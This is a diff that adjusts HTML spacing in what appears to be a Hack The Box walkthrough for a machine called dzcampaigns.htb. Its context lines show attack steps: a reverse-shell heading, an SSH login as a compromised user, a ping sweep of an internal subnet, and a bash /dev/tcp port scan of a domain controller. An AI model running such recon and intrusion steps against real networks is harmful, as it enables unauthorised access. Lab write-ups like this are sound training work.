@@ -81,7 +81,6 @@ echo "TARGET_IP dzcampaigns.htb" | sudo tee -a /etc/hosts
 Then at `http://dzcampaigns.htb/register`, create a character; note the character ID from the edit URL (`/character/<ID>/edit`). Below assumes ID 15.
 <div align="center">
 <br>
-<br>
 </div>
 
 ### Reverse shell
@@ -123,7 +122,6 @@ const r = await fetch("/character/15", {
 console.log(r.status);
 ```
 <div align="center">
-<br>
 <br>
 </div>
 
@@ -202,12 +200,18 @@ ssh josh@TARGET_IP
 <div style="page-break-after: always;"></div>
 
 ## Internal recon (as josh on SRV01)
+<div align="center">
+<br>
+</div>
 
 ### Local services
 
 ```bash
 ss -tlnp
 ```
+<div align="center">
+<br>
+</div>
 
 ### Map internal net
 
@@ -216,12 +220,18 @@ for i in 1 2 3 4 5 10 20 100; do (ping -c1 -W1 172.16.20.$i >/dev/null 2>&1 && e
 cat /etc/resolv.conf
 ip route
 ```
+<div align="center">
+<br>
+</div>
 
 ### Port-scan the DC
 
 ```bash
 for p in 22 53 80 88 135 139 389 443 445 464 636 3000 3268 3389 5985 9389; do (timeout 1 bash -c "echo > /dev/tcp/172.16.20.2/$p" 2>/dev/null && echo "$p OPEN") & done 2>/dev/null; wait
 ```
+<div align="center">
+<br>
+</div>
 
 ### Fingerprint Gitea
 
